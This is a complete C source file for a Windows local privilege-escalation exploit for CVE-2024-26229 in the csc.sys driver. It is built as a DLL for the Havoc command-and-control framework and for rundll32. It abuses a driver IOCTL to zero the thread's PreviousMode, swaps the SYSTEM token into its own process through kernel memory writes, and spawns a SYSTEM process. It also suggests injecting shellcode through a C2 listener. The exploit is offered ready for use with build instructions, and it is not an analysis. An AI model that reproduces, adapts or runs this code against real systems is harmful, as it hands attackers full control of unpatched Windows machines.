/*
 * CVE-2024-26229 LPE Exploit - DLL for Havoc DllSpawn
 *
 * Vuln:   CSC (csc.sys) driver IOCTL 0x001401a3 writes zero at input+0x18
 * Method: Zero KTHREAD.PreviousMode -> KernelMode -> NtWriteVirtualMemory
 *         can write kernel addresses -> DKOM copy SYSTEM token -> SYSTEM
 *
 * Targets: Windows 10 1809+ / Windows 11 (pre-April 2024 patch)
 * Patched: KB5036893 (April 9, 2024)
 *
 * Based on: github.com/RalfHacker/CVE-2024-26229-exploit
 *
 * Build: cl.exe /O2 /MT /LD exploit_dll.cpp /Fe:cve_2024_26229.dll
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>

#pragma comment(lib, "advapi32.lib")

#ifdef __cplusplus
extern "C" {
#endif

/* CSC IOCTL code that zeroes byte at (input + 0x18) */
#define CSC_IOCTL  0x001401a3

/* ================================================================
 * Build-specific EPROCESS/KTHREAD offsets (x64)
 * ================================================================ */
static ULONG g_tokenOffset      = 0;
static ULONG g_prevModeOffset   = 0;
static ULONG g_buildNumber      = 0;

static BOOL ResolveOffsets(void)
{
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (!hNt) return FALSE;

    RtlGetVersionPtr fn =
        (RtlGetVersionPtr)GetProcAddress(hNt, "RtlGetVersion");
    if (!fn) return FALSE;

    RTL_OSVERSIONINFOW vi;
    ZeroMemory(&vi, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (fn(&vi) != 0) return FALSE;

    g_buildNumber = vi.dwBuildNumber;
    printf("[*] OS: Windows %lu.%lu Build %lu\n",
           vi.dwMajorVersion, vi.dwMinorVersion, g_buildNumber);

    /*
     * EPROCESS.Token offsets per build:
     *   10240-17763  (1507-1809):  0x358
     *   18362-18363  (1903-1909):  0x360
     *   19041-26100+ (2004-24H2):  0x4B8
     *
     * KTHREAD.PreviousMode:
     *   All x64 builds 10240+:     0x232
     */
    g_prevModeOffset = 0x232;

    if (g_buildNumber <= 17763)
        g_tokenOffset = 0x358;
    else if (g_buildNumber <= 18363)
        g_tokenOffset = 0x360;
    else
        g_tokenOffset = 0x4B8;

    printf("[+] Offsets: Token=0x%X PreviousMode=0x%X\n",
           g_tokenOffset, g_prevModeOffset);

    return TRUE;
}

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);          \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;              \
}
#endif

/* ================================================================
 * Handle enumeration structures (SystemHandleInformation, class 0x10)
 * ================================================================ */
typedef struct _SYS_HANDLE_ENTRY {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYS_HANDLE_ENTRY;

typedef struct _SYS_HANDLE_INFO {
    ULONG            NumberOfHandles;
    SYS_HANDLE_ENTRY Handles[1];
} SYS_HANDLE_INFO;

/* ================================================================
 * ntdll function pointers
 * ================================================================ */
typedef NTSTATUS (NTAPI *fn_NtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *fn_NtQuerySystemInformation)(
    ULONG, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *fn_NtFsControlFile)(
    HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK,
    ULONG, PVOID, ULONG, PVOID, ULONG);

typedef NTSTATUS (NTAPI *fn_NtCreateFile)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);

typedef VOID (NTAPI *fn_RtlInitUnicodeString)(
    PUNICODE_STRING, PCWSTR);

static fn_NtWriteVirtualMemory    pNtWriteVirtualMemory;
static fn_NtQuerySystemInformation pNtQuerySystemInformation;
static fn_NtFsControlFile         pNtFsControlFile;
static fn_NtCreateFile            pNtCreateFile;
static fn_RtlInitUnicodeString    pRtlInitUnicodeString;

/* ================================================================
 * Globals
 * ================================================================ */
static wchar_t g_target[MAX_PATH] = L"notepad.exe";

/* ================================================================
 * FixStdout - reconnect CRT stdout to Havoc pipe
 * ================================================================ */
static void FixStdout(void)
{
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == NULL || hOut == INVALID_HANDLE_VALUE) return;
    int fd = _open_osfhandle((intptr_t)hOut, _O_TEXT);
    if (fd < 0) return;
    _dup2(fd, _fileno(stdout));
    setvbuf(stdout, NULL, _IONBF, 0);
}

/* ================================================================
 * Resolve ntdll functions
 * ================================================================ */
static BOOL NtLoad(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;

    pNtWriteVirtualMemory     = (fn_NtWriteVirtualMemory)GetProcAddress(h, "NtWriteVirtualMemory");
    pNtQuerySystemInformation = (fn_NtQuerySystemInformation)GetProcAddress(h, "NtQuerySystemInformation");
    pNtFsControlFile          = (fn_NtFsControlFile)GetProcAddress(h, "NtFsControlFile");
    pNtCreateFile             = (fn_NtCreateFile)GetProcAddress(h, "NtCreateFile");
    pRtlInitUnicodeString     = (fn_RtlInitUnicodeString)GetProcAddress(h, "RtlInitUnicodeString");

    return (pNtWriteVirtualMemory && pNtQuerySystemInformation &&
            pNtFsControlFile && pNtCreateFile && pRtlInitUnicodeString);
}

/* ================================================================
 * Get kernel object address via SystemHandleInformation
 * ================================================================ */
static BOOL GetObjPtr(PULONG64 pAddr, ULONG pid, HANDLE handle)
{
    SYS_HANDLE_INFO *pInfo = NULL;
    ULONG size = 0;
    NTSTATUS st;

    while ((st = pNtQuerySystemInformation(0x10, pInfo, size, &size)) == 0xC0000004L) {
        if (pInfo)
            pInfo = (SYS_HANDLE_INFO*)HeapReAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, pInfo, (SIZE_T)size * 2);
        else
            pInfo = (SYS_HANDLE_INFO*)HeapAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)size * 2);
        if (!pInfo) return FALSE;
    }

    if (st != 0) {
        if (pInfo) HeapFree(GetProcessHeap(), 0, pInfo);
        return FALSE;
    }

    BOOL found = FALSE;
    for (ULONG i = 0; i < pInfo->NumberOfHandles; i++) {
        if (pInfo->Handles[i].UniqueProcessId == (USHORT)pid &&
            pInfo->Handles[i].HandleValue == (USHORT)(ULONG_PTR)handle) {
            *pAddr = (ULONG64)pInfo->Handles[i].Object;
            found = TRUE;
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, pInfo);
    return found;
}

/* ================================================================
 * Check if running as SYSTEM
 * ================================================================ */
static BOOL IsSystem(void)
{
    HANDLE hToken = NULL;
    BOOL result = FALSE;
    DWORD size = 0;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &size);
    if (size == 0) { CloseHandle(hToken); return FALSE; }

    TOKEN_USER *tu = (TOKEN_USER*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!tu) { CloseHandle(hToken); return FALSE; }

    if (GetTokenInformation(hToken, TokenUser, tu, size, &size)) {
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID sysSid = NULL;
        if (AllocateAndInitializeSid(&ntAuth, 1, SECURITY_LOCAL_SYSTEM_RID,
                                     0, 0, 0, 0, 0, 0, 0, &sysSid)) {
            result = EqualSid(tu->User.Sid, sysSid);
            FreeSid(sysSid);
        }
    }

    HeapFree(GetProcessHeap(), 0, tu);
    CloseHandle(hToken);
    return result;
}

/* ================================================================
 * Core exploit
 * ================================================================ */
static BOOL DoExploit(void)
{
    UNICODE_STRING   objName  = {0};
    OBJECT_ATTRIBUTES objAttr = {0};
    IO_STATUS_BLOCK  iosb     = {0};
    HANDLE  hCsc = NULL;
    NTSTATUS st;

    ULONG64 sysEproc = 0, curEproc = 0, curKthread = 0;
    HANDLE  hProc = NULL, hThread = NULL;

    printf("[*] CVE-2024-26229 - CSC Driver LPE\n");
    printf("[*] Target process: %S\n\n", g_target);

    if (IsSystem()) {
        printf("[+] Already SYSTEM!\n");
        goto spawn;
    }

    /* 1 - Resolve offsets + ntdll */
    if (!ResolveOffsets()) {
        printf("[-] Failed to detect OS version\n");
        return FALSE;
    }
    if (!NtLoad()) {
        printf("[-] ntdll resolve failed\n");
        return FALSE;
    }
    printf("[+] ntdll functions resolved\n");

    /* 2 - Open CSC device */
    pRtlInitUnicodeString(&objName, L"\\Device\\Mup\\;Csc\\.\\.");
    InitializeObjectAttributes(&objAttr, &objName, 0, NULL, NULL);

    st = pNtCreateFile(&hCsc, SYNCHRONIZE, &objAttr, &iosb, NULL,
                       FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF,
                       FILE_CREATE_TREE_CONNECTION, NULL, 0);
    if (st != 0) {
        printf("[-] Open CSC failed: 0x%08x\n", (unsigned)st);
        printf("[-] csc.sys not loaded? Enable Offline Files\n");
        return FALSE;
    }
    printf("[+] CSC device opened\n");

    /* 3 - System EPROCESS (PID 4, handle 4) */
    if (!GetObjPtr(&sysEproc, 4, (HANDLE)4)) {
        printf("[-] System EPROCESS query failed\n");
        CloseHandle(hCsc);
        return FALSE;
    }
    printf("[+] System EPROCESS:  0x%llx\n", sysEproc);

    /* 4 - Current KTHREAD */
    hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    if (!hThread) {
        printf("[-] OpenThread: %u\n", GetLastError());
        CloseHandle(hCsc);
        return FALSE;
    }
    if (!GetObjPtr(&curKthread, GetCurrentProcessId(), hThread)) {
        printf("[-] KTHREAD query failed\n");
        CloseHandle(hThread); CloseHandle(hCsc);
        return FALSE;
    }
    printf("[+] Current KTHREAD:  0x%llx\n", curKthread);
    CloseHandle(hThread);

    /* 5 - Current EPROCESS */
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, GetCurrentProcessId());
    if (!hProc) {
        printf("[-] OpenProcess: %u\n", GetLastError());
        CloseHandle(hCsc);
        return FALSE;
    }
    if (!GetObjPtr(&curEproc, GetCurrentProcessId(), hProc)) {
        printf("[-] EPROCESS query failed\n");
        CloseHandle(hProc); CloseHandle(hCsc);
        return FALSE;
    }
    printf("[+] Current EPROCESS: 0x%llx\n", curEproc);
    CloseHandle(hProc);

    /* 6 - Trigger: IOCTL zeroes byte at (input + 0x18) -> zero PreviousMode */
    printf("[*] Triggering CSC IOCTL 0x%x...\n", CSC_IOCTL);
    st = pNtFsControlFile(hCsc, NULL, NULL, NULL, &iosb, CSC_IOCTL,
                          (PVOID)(curKthread + g_prevModeOffset - 0x18),
                          0, NULL, 0);
    CloseHandle(hCsc);

    if (st != 0) {
        printf("[-] NtFsControlFile: 0x%08x\n", (unsigned)st);
        printf("[-] Patched? (KB5036893, April 2024)\n");
        return FALSE;
    }
    printf("[+] PreviousMode -> KernelMode (0)\n");

    /* 7 - DKOM: copy SYSTEM EPROCESS.Token -> current EPROCESS.Token */
    printf("[*] DKOM: overwriting EPROCESS.Token (offset 0x%X)...\n", g_tokenOffset);
    {
        ULONG written = 0;
        st = pNtWriteVirtualMemory(
            GetCurrentProcess(),
            (PVOID)(curEproc  + g_tokenOffset),
            (PVOID)(sysEproc  + g_tokenOffset),
            8, &written);
    }
    if (st != 0) {
        printf("[-] Token write failed: 0x%08x\n", (unsigned)st);
        return FALSE;
    }
    printf("[+] EPROCESS.Token replaced!\n");

    /* 8 - Restore PreviousMode = UserMode (1) */
    {
        UCHAR mode = 1;
        ULONG written = 0;
        pNtWriteVirtualMemory(
            GetCurrentProcess(),
            (PVOID)(curKthread + g_prevModeOffset),
            &mode, 1, &written);
        printf("[+] PreviousMode restored -> UserMode\n");
    }

    /* 9 - Verify */
    if (!IsSystem()) {
        printf("[-] Token swap verify FAILED\n");
        return FALSE;
    }
    printf("[+] === WE ARE NT AUTHORITY\\SYSTEM ===\n\n");

spawn:
    /* 10 - Spawn target process (inherits SYSTEM token) */
    {
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.lpDesktop = (LPWSTR)L"WinSta0\\Default";

        wchar_t cmd[MAX_PATH];
        lstrcpynW(cmd, g_target, MAX_PATH);

        printf("[*] Spawning: %S\n", g_target);
        if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[-] CreateProcessW: %u\n", GetLastError());
            return FALSE;
        }

        printf("\n");
        printf("[+] ==================================\n");
        printf("[+]  SYSTEM process created!\n");
        printf("[+]  Process: %S\n", g_target);
        printf("[+]  PID:     %u\n", pi.dwProcessId);
        printf("[+] ==================================\n");
        printf("\n");
        printf("[*] Next: shinject %u x64 <listener>\n", pi.dwProcessId);

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    return TRUE;
}

/* ================================================================
 * Check mode - no exploitation, just recon
 * ================================================================ */
static void DoCheck(void)
{
    printf("[*] CVE-2024-26229 - Pre-flight Check\n\n");

    /* OS version */
    typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (hNt) {
        RtlGetVersionPtr fn =
            (RtlGetVersionPtr)GetProcAddress(hNt, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW vi;
            ZeroMemory(&vi, sizeof(vi));
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) == 0) {
                printf("[*] OS: Windows %lu.%lu Build %lu\n",
                       vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
            }
        }
    }

    /* Architecture */
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    printf("[*] Arch: %s\n",
           sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64
               ? "x64" : "x86");
    if (sysInfo.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64)
        printf("[!] x86 not supported (offsets are x64 only)\n");

    printf(IsSystem() ? "[+] Already SYSTEM\n" : "[*] Not SYSTEM (normal user)\n");

    /* ntdll */
    if (!NtLoad()) {
        printf("[-] ntdll resolve FAILED\n");
        return;
    }
    printf("[+] ntdll functions OK\n");

    /* CSC device probe */
    UNICODE_STRING    objName;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK   iosb;
    pRtlInitUnicodeString(&objName, L"\\Device\\Mup\\;Csc\\.\\.");
    InitializeObjectAttributes(&objAttr, &objName, 0, NULL, NULL);

    HANDLE hCsc;
    NTSTATUS st = pNtCreateFile(&hCsc, SYNCHRONIZE, &objAttr, &iosb, NULL,
                                FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF,
                                FILE_CREATE_TREE_CONNECTION, NULL, 0);
    if (st == 0) {
        printf("[+] CSC device: ACCESSIBLE (csc.sys loaded)\n");
        CloseHandle(hCsc);
    } else {
        printf("[-] CSC device: NOT accessible (0x%08x)\n", (unsigned)st);
        printf("    Enable Offline Files in Control Panel\n");
    }

    /* System EPROCESS */
    ULONG64 sysProc = 0;
    if (GetObjPtr(&sysProc, 4, (HANDLE)4))
        printf("[+] System EPROCESS: 0x%llx\n", sysProc);
    else
        printf("[-] Handle enumeration failed\n");

    printf("\n[*] Check complete\n");
}

/* ================================================================
 * Parse arguments from lpvReserved
 * ================================================================ */
static void ParseArgs(const char *args)
{
    if (!args || !args[0]) return;
    while (*args == ' ' || *args == '\t') args++;

    if (strncmp(args, "run", 3) == 0) {
        const char *p = args + 3;
        while (*p == ' ' || *p == '\t') p++;
        if (*p && *p != '\r' && *p != '\n') {
            MultiByteToWideChar(CP_ACP, 0, p, -1, g_target, MAX_PATH);
            int len = lstrlenW(g_target);
            while (len > 0 && (g_target[len-1] == L' ' ||
                               g_target[len-1] == L'\r' ||
                               g_target[len-1] == L'\n'))
                g_target[--len] = 0;
        }
    }
}

/* ================================================================
 * DllMain - entry point for Havoc DllSpawn
 * ================================================================ */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        FixStdout();

        const char *args = NULL;
        if (lpvReserved && ((const char*)lpvReserved)[0] != '\0')
            args = (const char*)lpvReserved;

        printf("[cve-2024-26229] args: %s\n\n", args ? args : "(none)");

        if (args && strncmp(args, "check", 5) == 0)
            DoCheck();
        else {
            ParseArgs(args);
            DoExploit();
        }

        printf("\n[cve-2024-26229] Done\n");
        fflush(stdout);
    }

    return TRUE;
}

/* ================================================================
 * StartW / Start - for rundll32 usage
 * ================================================================ */
__declspec(dllexport)
void CALLBACK StartW(HWND hwnd, HINSTANCE hinst, LPWSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    FixStdout();

    char buf[512] = {0};
    if (cmd && cmd[0])
        WideCharToMultiByte(CP_ACP, 0, cmd, -1, buf, 511, NULL, NULL);

    if (buf[0] && strncmp(buf, "check", 5) == 0)
        DoCheck();
    else {
        ParseArgs(buf[0] ? buf : NULL);
        DoExploit();
    }
    fflush(stdout);
}

__declspec(dllexport)
void CALLBACK Start(HWND hwnd, HINSTANCE hinst, LPSTR cmd, int show)
{
    (void)hwnd; (void)hinst; (void)show;
    FixStdout();

    if (cmd && cmd[0] && strncmp(cmd, "check", 5) == 0)
        DoCheck();
    else {
        ParseArgs(cmd);
        DoExploit();
    }
    fflush(stdout);
}

#ifdef __cplusplus
}
#endif
